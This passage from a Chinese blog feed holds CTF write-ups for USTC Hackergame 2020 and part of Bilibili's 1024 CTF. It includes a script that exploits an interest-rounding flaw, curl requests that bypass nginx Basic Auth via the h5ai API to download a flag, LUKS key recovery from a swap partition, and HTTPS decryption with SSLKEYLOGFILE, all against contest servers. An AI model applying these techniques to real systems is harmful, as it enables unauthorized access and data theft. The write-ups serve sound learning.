<code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span 